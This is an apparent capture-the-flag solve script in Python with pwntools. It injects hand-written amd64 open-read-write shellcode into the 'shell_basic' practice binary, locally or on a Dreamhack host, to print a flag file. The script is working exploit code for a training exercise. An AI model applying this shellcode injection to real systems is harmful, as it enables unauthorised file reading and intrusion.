#!/usr/bin/python3

from pwn import *

# context.log_level = 'debug' 
exe = context.binary = ELF('./shell_basic', checksec=False)



# Shorthanding functions for input/output
info = lambda msg: log.info(msg)
s = lambda data: p.send(data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
r = lambda: p.recv()
rl = lambda: p.recvline()
rall = lambda: p.recvall()

# GDB scripts for debugging
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


c
''')

p = remote('host3.dreamhack.games', 19024 ) if args.REMOTE else process(argv=[exe.path], aslr=False)
if args.GDB: 
    GDB()
    input()

# ===========================================================
#                          EXPLOIT 
# ===========================================================


shell = asm(
    '''
    mov rax, 0x676E6F6F6F6F6F6F 
    push rax
    mov rax, 0x6C5F73695F656D61 
    push rax
    mov rax, 0x6E5F67616C662F63 
    push rax
    mov rax, 0x697361625f6c6c65 
    push rax
    mov rax, 0x68732f656d6f682f 
    push rax
    mov rdi, rsp     
    xor rsi, rsi    
    xor rdx, rdx    
    mov rax, 2      
    syscall         

    mov rdi, rax      
    mov rsi, rsp
    sub rsi, 0x30     
    mov rdx, 0x30     
    mov rax, 0x0      
    syscall           

    mov rdi, 1        
    mov rax, 0x1      
    syscall           

    mov rax, 0x3C     
    mov rdi, 0        
    syscall
    ''',arch='amd64')


sla('shellcode: ',shell)
print(p.recv())

p.interactive()
